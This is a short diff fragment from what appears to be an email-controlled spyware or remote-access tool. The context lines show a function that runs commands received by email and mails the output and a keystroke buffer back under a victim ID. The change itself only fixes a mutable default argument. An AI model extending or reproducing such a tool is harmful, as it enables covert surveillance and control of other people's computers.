@@ -145,7 +145,7 @@ def run_command_order(email_body):
     logprint("INFO: Ran given command, sending output.")
     send_results(message_text=f'Command order "{command_order}" outputed the following:\n{results}', subject=f"Command output from {ID}")
 
-def send_results(message_text="",file_paths=[], subject=f"Report from {ID}"):
+def send_results(message_text="",file_paths=None, subject=f"Report from {ID}"):
     print("INFO: Running sending check...")
     global log, typed_string
     if log != "" or message_text != "":
